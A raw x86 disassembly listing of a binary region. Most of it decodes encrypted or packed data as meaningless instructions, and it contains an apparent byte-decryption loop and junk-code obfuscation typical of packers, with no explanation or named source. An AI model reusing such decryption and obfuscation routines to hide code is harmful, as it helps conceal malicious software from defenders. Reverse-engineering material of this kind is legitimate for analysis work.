  4163db:	dec    eax
  4163dc:	ins    BYTE PTR es:[edi],dx
  4163dd:	fcomp  QWORD PTR [esi-0x3087015f]
  4163e3:	xchg   esi,eax
  4163e4:	xor    al,0x25
  4163e6:	retf   
  4163e7:	sahf   
  4163e8:	out    0x46,al
  4163ea:	pop    ds
  4163eb:	in     al,0x49
  4163ed:	push   ebx
  4163ee:	aas    
  4163ef:	push   es
  4163f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163f1:	push   edi
  4163f2:	dec    ebp
  4163f3:	jnp    0x41646b
  4163f5:	cmp    DWORD PTR [ebx],0x215259d8
  4163fb:	adc    eax,0x83e8e94b
  416400:	aam    0x3f
  416402:	ret    
  416403:	push   esp
  416404:	mov    ds:0x284dd39c,al
  416409:	jo     0x41642d
  41640b:	outs   dx,BYTE PTR ds:[esi]
  41640c:	and    edi,ecx
  41640e:	retf   0xef1b
  416411:	mov    bl,0x6
  416413:	es ins DWORD PTR es:[edi],dx
  416415:	test   eax,0x5bb450c9
  41641a:	push   esi
  41641b:	or     BYTE PTR [ebx+0x38da5a0e],0x10
  416422:	rep ins BYTE PTR es:[edi],dx
  416424:	cmc    
  416425:	daa    
  416426:	lods   eax,DWORD PTR ds:[esi]
  416427:	add    DWORD PTR [eax+0xb],eax
  41642a:	jmp    DWORD PTR [edx]
  41642c:	mov    dl,0x88
  41642e:	aas    
  41642f:	cs fdivrp st(4),st
  416432:	mov    dh,0xdc
  416434:	mov    al,0xb4
  416436:	mov    ch,0x88
  416438:	mov    eax,0xd0a018db
  41643d:	mov    ds,ebx
  41643f:	xchg   esi,eax
  416440:	jb     0x416497
  416442:	out    dx,eax
  416443:	pop    esi
  416444:	pop    edi
  416445:	fld    QWORD PTR [ebp-0x132cc8f]
  41644b:	mov    esp,0xd3c16d84
  416450:	sub    edx,DWORD PTR [ecx+0x2813dbc6]
  416456:	push   edx
  416457:	into   
  416458:	fs push ds
  41645a:	mov    ebx,0xe3b84c3b
  41645f:	rol    DWORD PTR [ecx-0x24702504],0x0
  416466:	or     eax,0xba0526c6
  41646b:	loopne 0x41648e
  41646d:	pushf  
  41646e:	dec    edi
  41646f:	xchg   ebp,eax
  416470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416471:	adc    eax,0x68ffd201
  416476:	push   0xfffffff1
  416478:	clc    
  416479:	jo     0x416465
  41647b:	jns    0x416448
  41647d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41647e:	(bad)
  416482:	xchg   edx,eax
  416483:	arpl   WORD PTR [edi],cx
  416485:	in     al,dx
  416486:	mov    DWORD PTR [ebp+0x8],0x69a94adf
  41648d:	add    BYTE PTR [ebx+edx*4+0x5a],0xc
  416492:	push   0xe07e1a93
  416497:	jg     0x4164c9
  416499:	mov    edx,0xcd9c28e7
  41649e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41649f:	mov    bl,0x15
  4164a1:	je     0x416514
  4164a3:	fsub   st(6),st
  4164a5:	lods   al,BYTE PTR ds:[esi]
  4164a6:	leave  
  4164a7:	xor    DWORD PTR [ebp+esi*2+0x636900d2],0xe78e68ae
  4164b2:	ss adc ah,dl
  4164b5:	(bad)  
  4164b7:	call   0x6b1a6dcf
  4164bc:	mov    eax,ds:0x1845b8d2
  4164c1:	cmp    al,0xce
  4164c3:	mov    ecx,0xbb70b5c3
  4164c8:	mov    edi,DWORD PTR [ecx+0x7242ec3b]
  4164ce:	cs pop esi
  4164d0:	dec    edi
  4164d1:	test   DWORD PTR [ebx],esi
  4164d3:	mov    al,ds:0xe272d928
  4164d8:	arpl   WORD PTR [eax],bp
  4164da:	push   0x8f0be736
  4164df:	add    al,0xfc
  4164e1:	sub    eax,0xaf9202ae
  4164e6:	adc    al,0x43
  4164e8:	push   edi
  4164e9:	pop    ds
  4164ea:	bound  ebp,QWORD PTR [ebp-0x717a8688]
  4164f0:	add    ebp,edx
  4164f2:	mov    BYTE PTR [ebx],ch
  4164f4:	pop    es
  4164f5:	adc    DWORD PTR [ebp-0x5e],ecx
  4164f8:	pushf  
  4164f9:	int    0x4e
  4164fb:	push   ebx
  4164fc:	in     al,0x1b
  4164fe:	enter  0x6955,0xe2
  416502:	and    eax,0xe3515370
  416507:	push   ecx
  416508:	data16 out 0x62,al
  41650b:	imul   edi,DWORD PTR [ecx+edx*1-0x45],0x5b26be16
  416513:	mov    bh,0x37
  416515:	mov    ebp,0x7fb87cfc
  41651a:	xchg   ebp,eax
  41651b:	mov    ds:0x9025cecf,eax
  416520:	aad    0xcb
  416522:	sub    ah,dl
  416524:	cmc    
  416525:	scas   al,BYTE PTR es:[edi]
  416526:	scas   eax,DWORD PTR es:[edi]
  416527:	gs ret 
  416529:	test   al,0xa8
  41652b:	pop    ds
  41652c:	int    0x25
  41652e:	mov    esp,0xcc7166df
  416533:	sar    DWORD PTR [eax+0x2af2d590],1
  416539:	sbb    eax,0x4fb994f1
  41653e:	pop    ss
  41653f:	push   ss
  416540:	lea    ebx,gs:[ebx+0x2d7e0a42]
  416547:	fld    DWORD PTR [edi+0x69]
  41654a:	push   ecx
  41654b:	shl    DWORD PTR [esi+0x64bd9f2e],1
  416551:	xchg   ebp,eax
  416552:	into   
  416553:	(bad)  
  416554:	out    0x32,eax
  416556:	sbb    ecx,DWORD PTR [esp+esi*8-0x7605f94d]
  41655d:	cmp    esi,DWORD PTR [ebx]
  41655f:	mov    ecx,0xc80b02e8
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422588
  416605:	mov    edi,0x4224ce
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422588
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x7ba2cc70]
  416729:	mov    al,0x77
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx-0x4ee7e7ec],bl
  416733:	cmp    DWORD PTR [ecx+0x1aed6e2f],ebp
  416739:	arpl   WORD PTR [edi+0x65],di
  41673c:	das    
  41673d:	mov    ds:0xdd747fc3,al
  416742:	mov    WORD PTR [bp-0x9],cs
  416746:	cmp    DWORD PTR [edi+0x77113f78],esi
  41674c:	jmp    0x80f8:0x5b9f928f
  416753:	add    eax,0xe491d060
  416758:	inc    ch
  41675a:	add    eax,0xe3b92895
  41675f:	jmp    0x99a0:0x935f6c4f
  416766:	scas   eax,DWORD PTR es:[edi]
  416767:	dec    edx
  416768:	xchg   BYTE PTR [edi-0x51],cl
  41676b:	repz jmp 0xaf70:0xecdefdc8
  416773:	js     0x416762
  416775:	jb     0x416714
  416777:	ret    0xebb9
  41677a:	test   al,0x5
  41677c:	imul   edx,DWORD PTR [ebp-0x246ba453],0xf7e9897a
  416786:	add    DWORD PTR cs:[esi+ecx*1+0x434b3f6c],edx
  41678e:	push   ebx
  41678f:	sub    BYTE PTR [ebp-0x4],ah
  416792:	test   DWORD PTR ds:0x82787e,ebx
  416798:	pushf  
  416799:	sbb    eax,0xf8d3298c
  41679e:	jbe    0x416777
  4167a0:	pop    edx
  4167a1:	imul   ebp,DWORD PTR [ecx+0x4f714da2],0xcbae87e2
  4167ab:	ja     0x416806
  4167ad:	cmp    BYTE PTR [esi],ah
  4167af:	int    0xef
  4167b1:	jp     0x4167b6
  4167b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167b4:	cmp    DWORD PTR gs:[edx+0x13ea9773],eax
  4167bb:	js     0x4167d5
  4167bd:	ud1    esi,DWORD PTR [esi+0x14]
  4167c1:	mov    cl,0xb3
  4167c3:	in     eax,dx
  4167c4:	dec    edx
  4167c5:	scas   eax,DWORD PTR es:[edi]
  4167c6:	(bad)  
  4167c7:	clc    
  4167c8:	mov    cl,0xe2
  4167ca:	inc    ebx
  4167cb:	xor    edx,edx
  4167cd:	jne    0x41682b
  4167cf:	icebp  
  4167d0:	retf   0xc12e
  4167d3:	dec    eax
  4167d4:	(bad)  
  4167d5:	or     DWORD PTR [edi+0x46e36c0f],esi
  4167db:	cdq    
  4167dc:	xor    BYTE PTR [ecx],0x8
  4167df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167e0:	xchg   esi,eax
  4167e1:	dec    edi
  4167e2:	fwait
  4167e3:	icebp  
  4167e4:	add    ebx,DWORD PTR [edx+0x70]
  4167e7:	ror    DWORD PTR [esi-0x18960a52],1
  4167ed:	push   esp
  4167ee:	cmc    
  4167ef:	or     dl,0x1b
  4167f2:	popf   
  4167f3:	ins    BYTE PTR es:[edi],dx
  4167f4:	cmc    
  4167f5:	inc    esp
  4167f6:	fs out 0x9f,eax
  4167f9:	bnd ja 0x4167d8
  4167fc:	ja     0x4167dc
  4167fe:	dec    esp
  4167ff:	loope  0x4167b1
  416801:	sub    ebx,DWORD PTR fs:[ebp-0x570dfa0e]
  416808:	fmul   DWORD PTR [ebp-0x52a16882]
  41680e:	outs   dx,DWORD PTR ds:[esi]
  41680f:	outs   dx,BYTE PTR ds:[esi]
  416810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416811:	jg     0x4167c3
  416813:	push   edx
  416814:	fimul  DWORD PTR ds:0x34a13429
  41681a:	jge    0x41688d
  41681c:	mov    ss,ebp
  41681e:	loope  0x41684c
  416820:	mov    dl,0xd5
  416822:	xor    BYTE PTR [esi],ah
  416824:	retf   
  416825:	and    DWORD PTR [edi-0x5661686c],eax
  41682b:	mov    cs,edx
  41682d:	addr16 mov eax,ds:0x5b97
  416831:	js     0x4167fc
  416833:	inc    ebp
  416834:	xor    DWORD PTR [ecx],ebx
  416836:	ret    
  416837:	mov    BYTE PTR [eax-0x7f547199],cl
  41683d:	dec    eax
  41683e:	sar    DWORD PTR [eax],1
  416840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416841:	add    eax,0xd9c0d05b
  416846:	xor    DWORD PTR [edx+0x7972e52],edi
  41684c:	push   esp
  41684d:	adc    esi,edi
  41684f:	push   ebp
  416850:	test   ch,ah
  416852:	mov    dl,0x4d
  416854:	pcmpgtd mm1,QWORD PTR [eax+0x308b7518]
  41685b:	je     0x4168c8
  41685d:	dec    ebp
  41685e:	arpl   bx,bp
  416860:	xchg   ebp,eax
  416861:	out    dx,eax
  416862:	jo     0x4168d5
  416864:	pop    ebx
  416865:	imul   ebp,DWORD PTR [ebp-0x48],0x4f
  416869:	shl    DWORD PTR [eax],0x53
  41686c:	or     ch,ah
  41686e:	scas   al,BYTE PTR es:[edi]
  41686f:	cmp    bh,BYTE PTR [ebx+0x2c]
  416872:	aam    0x90
  416874:	sbb    BYTE PTR [edi+esi*8+0xc1c07fd],al
  41687b:	leave  
  41687c:	pusha  
  41687d:	adc    esp,DWORD PTR [ebx+0x4e9dfbb8]
  416883:	in     al,dx
  416884:	mov    BYTE PTR [eax+0x52],dl
  416887:	mov    eax,0x221ee2a6
  41688c:	push   cs
  41688d:	gs sbb eax,0x27d26a4
  416893:	fld    DWORD PTR [esi+ebx*4-0x4f]
  416897:	pop    esp
  416898:	ret    
  416899:	jg     0x416894
  41689b:	test   al,0xec
  41689d:	lock inc eax
  41689f:	push   ebx
  4168a0:	fcmovb st,st(7)
  4168a2:	wbinvd 
  4168a4:	sbb    dl,BYTE PTR [ebx]
  4168a6:	mov    ch,BYTE PTR [eax+0x4b]
  4168a9:	mov    cl,0x6c
  4168ab:	dec    eax
  4168ac:	pop    ds
  4168ad:	mov    DWORD PTR [edi-0x5b3666cc],eax
  4168b3:	cmp    al,0xda
  4168b5:	add    ebx,eax
  4168b7:	and    edx,edx
  4168b9:	push   0x7c1102b7
  4168be:	inc    edx
  4168bf:	fs dec esi
  4168c1:	ret    0x922d
  4168c4:	cdq    
  4168c5:	jne    0x4168df
  4168c7:	mov    cl,0xe
  4168c9:	fisubr WORD PTR [ebx]
  4168cb:	mov    al,dh
  4168cd:	out    0x18,al
  4168cf:	(bad)  
  4168d0:	dec    ebp
  4168d1:	add    al,0x6a
  4168d3:	mov    edx,0x5f232883
  4168d8:	js     0x4168b2
  4168da:	rcl    DWORD PTR [esi],1
  4168dc:	fwait
  4168dd:	out    dx,eax
  4168de:	jns    0x4168f2
  4168e0:	adc    bh,BYTE PTR [edx]
  4168e2:	mov    ebp,0x9743e148
  4168e7:	loop   0x41693a
  4168e9:	xor    DWORD PTR [edi+esi*4-0x58],esi
  4168ed:	jns    0x4168f1
  4168ef:	mov    dl,0x78
  4168f1:	adc    DWORD PTR [ecx+0x5a],edx
  4168f4:	cli    
  4168f5:	icebp  
  4168f6:	(bad)  
  4168f7:	and    ah,BYTE PTR [edx+esi*8]
  4168fa:	add    al,0xac
  4168fc:	imul   ecx,ecx,0xffffffc8
  4168ff:	stc    
  416900:	push   0xffffff98
  416902:	or     al,0xb6
  416904:	adc    eax,0x8f21576b
  416909:	sbb    ecx,edi
  41690b:	aaa    
  41690c:	fld    DWORD PTR [ebx+eiz*1-0x48]
  416910:	jnp    0x41692c
  416912:	pushf  
  416913:	xor    BYTE PTR [eax-0x10],bl
  416916:	mov    ebp,DWORD PTR [eax]
  416918:	add    dl,BYTE PTR [ebx-0x904b561]
  41691e:	scas   al,BYTE PTR es:[edi]
  41691f:	in     eax,dx
  416920:	ret    
  416921:	jae    0x4168ae
  416923:	push   0x6d
  416925:	(bad)  
  416927:	inc    ebx
  416928:	mov    esp,0xcb007282
  41692d:	mov    al,0x6b
  41692f:	push   cs
  416930:	idiv   DWORD PTR [esi]
  416932:	test   al,0x81
  416934:	mov    bl,0xb5
  416936:	stos   BYTE PTR es:[edi],al
  416937:	hlt    
  416938:	stos   DWORD PTR es:[edi],eax
  416939:	add    al,0x25
  41693b:	or     bl,bh
  41693d:	sti    
  41693e:	xchg   esp,ebp
  416940:	add    edx,DWORD PTR [edi+0x1aac2dd3]
  416946:	les    esp,FWORD PTR [esi-0x3e]
  416949:	in     al,0xff
  41694b:	cmp    dl,BYTE PTR [ebx-0x42ed761f]
  416951:	lds    ebp,FWORD PTR [ebx]
  416953:	inc    ebx
  416954:	and    BYTE PTR [esi+0x4af1f6a7],cl
  41695a:	pop    ebx
  41695b:	loope  0x416993
  41695d:	iret   
  41695e:	pop    ebx
  41695f:	adc    dh,BYTE PTR [ebx-0x4b8ce58f]
  416965:	retf   0xa0dd
  416968:	push   es
  416969:	jbe    0x4169b1
  41696b:	xchg   ebp,eax
  41696c:	lods   eax,DWORD PTR ds:[esi]
  41696d:	xchg   DWORD PTR [ebx+0x7e],edx
  416970:	mov    bh,0x70
  416972:	jb     0x4169e0
  416974:	mov    ebx,0x50fe458d
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0x709bf2fe
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x19e7e7ec],bl
  4169ac:	je     0x4169d2
  4169ae:	xor    BYTE PTR [edx+0x25],bl
  4169b1:	(bad)  
  4169b2:	imul   eax,ebx,0x67
  4169b5:	fs cmp eax,0x27ed0cc
  4169bb:	jne    0x416a2d
  4169bd:	sub    al,BYTE PTR [ecx]
  4169bf:	add    ebx,DWORD PTR [edx+ecx*1+0x69]
  4169c3:	imul   esi,DWORD PTR es:[ecx+0x49],0x1582663a
  4169cb:	fistp  WORD PTR [esp+eiz*4+0x7a69875d]
  4169d2:	data16 (bad) 
  4169d4:	stos   BYTE PTR es:[edi],al
  4169d5:	ins    BYTE PTR es:[edi],dx
  4169d6:	iret   
  4169d7:	push   ecx
  4169d8:	cmp    DWORD PTR [esi],esi
  4169da:	xor    al,0xab
  4169dc:	in     al,dx
  4169dd:	adc    eax,esp
  4169df:	shl    BYTE PTR [ecx],cl
  4169e1:	or     esp,DWORD PTR [edx+0x6d63a908]
  4169e7:	mov    ebx,0x83648ab8
  4169ec:	xrelease mov BYTE PTR [ecx-0x5aada928],ah
  4169f3:	mov    bl,0xa1
  4169f5:	push   ds
  4169f6:	int    0x8c
  4169f8:	mov    edx,0x13990fea
  4169fd:	inc    esp
  4169fe:	push   edi
  4169ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a00:	jg     0x4169ca
  416a02:	adc    cl,BYTE PTR [ebx]
  416a04:	out    0x51,eax
  416a06:	xchg   esp,eax
  416a07:	push   ebx
  416a08:	dec    BYTE PTR cs:[edx+0xc11f26b]
  416a0f:	stc    
  416a10:	mov    eax,0xeb5012e3
  416a15:	icebp  
  416a16:	mov    ecx,0x72a5d44e
  416a1b:	jb     0x4169bc
  416a1d:	inc    ebx
  416a1e:	iret   
  416a1f:	mov    ?,WORD PTR ds:0x1c4c118b
  416a25:	inc    ecx
  416a26:	inc    ebx
  416a27:	fwait
  416a28:	jno    0x416aa4
  416a2a:	ja     0x4169e4
  416a2c:	outs   dx,DWORD PTR ds:[esi]
  416a2d:	pop    ss
  416a2e:	push   cs
  416a2f:	add    eax,0xca8e3490
  416a34:	or     BYTE PTR [ebp-0x29],bl
  416a37:	jmp    0x4b00:0xf519474d
  416a3e:	popf   
  416a3f:	mov    DWORD PTR [ecx-0x54],edx
  416a42:	sahf   
  416a43:	or     eax,0xaf2ecf12
  416a48:	mov    ebp,0x2279dd9
  416a4d:	mov    esp,0x3cae8174
  416a52:	jmp    0x416a28
  416a54:	sub    bh,BYTE PTR [eax+ecx*8-0x41b95369]
  416a5b:	lds    ecx,FWORD PTR [ebx]
  416a5d:	xchg   ecx,eax
  416a5e:	(bad)  
  416a60:	sbb    al,0x90
  416a62:	xor    ecx,ebp
  416a64:	push   esp
  416a65:	stos   DWORD PTR es:[edi],eax
  416a66:	xor    edx,ecx
  416a68:	mov    esp,0xf4737390
  416a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a6e:	sbb    bl,BYTE PTR [edx]
  416a70:	pop    edi
  416a71:	add    edi,DWORD PTR [edx+0x75]
  416a74:	pushf  
  416a75:	jg     0x416a47
  416a77:	retf   
  416a78:	jg     0x416aa9
  416a7a:	mov    ch,0x8d
  416a7c:	shl    ebx,0x31
  416a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a80:	sbb    edi,DWORD PTR [ebx+0x0]
  416a83:	jne    0x416ad8
  416a85:	mov    al,ds:0xc82e3cd7
  416a8a:	out    0xda,al
  416a8c:	mov    bh,0x4b
  416a8e:	lock clc 
  416a90:	mov    ecx,0x74da3b5
  416a95:	enter  0x2116,0x70
  416a99:	sahf   
  416a9a:	es add eax,0xd3a484a0
  416aa0:	aaa    
  416aa1:	mov    al,ds:0xd8954f
  416aa6:	fcmovbe st,st(5)
  416aa8:	(bad)  
  416aa9:	dec    ebp
  416aaa:	jns    0x416a5f
  416aac:	mov    eax,ds:0x87da84ba
  416ab1:	inc    edi
  416ab2:	add    BYTE PTR [ecx+0x48],dh
  416ab5:	or     ch,BYTE PTR ds:[edx+edi*2+0x60]
  416aba:	mov    al,0x80
  416abc:	cmp    ah,bl
  416abe:	test   al,0x77
  416ac0:	(bad)  
  416ac1:	outs   dx,BYTE PTR ds:[esi]
  416ac2:	shr    BYTE PTR [edi],0xf7
  416ac5:	cwde   
  416ac6:	pusha  
  416ac7:	jl     0x416a50
  416ac9:	pop    ebp
  416aca:	inc    esp
  416acb:	pop    ds
  416acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416acd:	mov    ds:0x926fd4f4,eax
  416ad2:	dec    eax
  416ad3:	fild   WORD PTR [esi+eiz*4+0x7d]
  416ad7:	std    
  416ad8:	sbb    BYTE PTR [ebp+0x62],ch
  416adb:	xor    bh,BYTE PTR [edi+0x7d105355]
  416ae1:	cli    
  416ae2:	inc    ecx
  416ae3:	inc    esp
  416ae4:	add    al,0x8d
  416ae6:	stos   BYTE PTR es:[edi],al
  416ae7:	cmp    edx,DWORD PTR [edx+0x335878dc]
  416aed:	cmc    
  416aee:	mov    BYTE PTR gs:[ecx-0x10ef383a],ch
  416af5:	loopne 0x416b3c
  416af7:	imul   eax
  416af9:	lods   al,BYTE PTR ds:[esi]
  416afa:	dec    ecx
  416afb:	ins    BYTE PTR es:[edi],dx
  416afc:	dec    ecx
  416afd:	call   0xc70d:0x20ec81c9
  416b04:	add    esi,DWORD PTR [ebx-0x64a962b7]
  416b0a:	rcr    DWORD PTR [esi+edx*2+0x7ae5255],cl
  416b11:	fdivr  QWORD PTR [ecx+0x33]
  416b14:	sub    BYTE PTR [ecx],dh
  416b16:	call   0x536c9c62
  416b1b:	mov    dl,0x93
  416b1d:	repnz arpl WORD PTR [ebp+0x16],sp
  416b21:	jns    0x416aed
  416b23:	out    dx,al
  416b24:	mov    al,ds:0x7dd085b4
  416b29:	adc    eax,0x47ae0ed8
  416b2e:	mov    dh,0xad
  416b30:	ins    DWORD PTR es:[edi],dx
  416b31:	call   FWORD PTR [eax+ecx*8]
  416b34:	loop   0x416ba4
  416b36:	sbb    DWORD PTR [ecx-0x29],0x11
  416b3a:	pop    edx
  416b3b:	xor    al,0x3b
  416b3d:	mov    ds:0x7eaa1648,eax
  416b42:	lock xchg esi,eax
  416b44:	mov    eax,ds:0x5c484468
  416b49:	or     DWORD PTR [edx-0x64],ecx
  416b4c:	iret   
  416b4d:	cld    
  416b4e:	cmp    dl,dl
  416b50:	int3   
  416b51:	lock mov al,ds:0x997be071
  416b57:	(bad)  
  416b58:	sbb    BYTE PTR [esi+0x60f6afe4],dl
  416b5e:	mov    edx,0xbe40e023
  416b63:	lods   eax,DWORD PTR ds:[esi]
  416b64:	mov    al,ds:0x8fcc771
  416b69:	ss jnp 0x416ba1
  416b6c:	es dec eax
  416b6e:	inc    ebx
  416b6f:	mov    ch,0x32
  416b71:	and    edx,ecx
  416b73:	shl    DWORD PTR [eax+0x4c],1
  416b76:	adc    ah,BYTE PTR [ebp-0x3ef2dc52]
  416b7c:	test   ecx,ebx
  416b7e:	xlat   BYTE PTR ds:[ebx]
  416b7f:	pop    ebx
  416b80:	ror    DWORD PTR [eax+0x24],0x1b
  416b84:	jge    0x416beb
  416b86:	clc    
  416b87:	dec    ebx
  416b88:	shr    bh,0x9e
  416b8b:	test   ch,dl
  416b8d:	xor    DWORD PTR [edi+0x15490519],edi
  416b93:	cmp    DWORD PTR [eax-0x65],esp
  416b96:	xor    edx,0x29
  416b99:	fmul   DWORD PTR [ebp-0x4]
  416b9c:	cmp    ah,BYTE PTR [ebx+0x1f]
  416b9f:	shr    BYTE PTR [esi+0x72],cl
  416ba2:	mov    dh,0xf3
  416ba4:	lahf   
  416ba5:	outs   dx,BYTE PTR ss:[esi]
  416ba7:	aaa    
  416ba8:	fldenv [ebp-0x7faf9c14]
  416bae:	dec    edx
  416baf:	retf   0xc03d
  416bb2:	mov    ebp,0xac7c69d5
  416bb7:	xchg   edi,eax
  416bb8:	jb     0x416b7f
  416bba:	test   BYTE PTR [esi-0x4bd84e23],ah
  416bc0:	pop    esi
  416bc1:	or     ebp,ebp
  416bc3:	adc    al,0x52
  416bc5:	mov    edi,0xef87632e
  416bca:	jmp    0x3209:0x826e28c
  416bd1:	in     eax,0x1
  416bd3:	pop    ebp
  416bd4:	xor    eax,0xbd721f9
  416bd9:	jns    0x416c03
  416bdb:	lods   al,BYTE PTR ds:[esi]
  416bdc:	push   esi
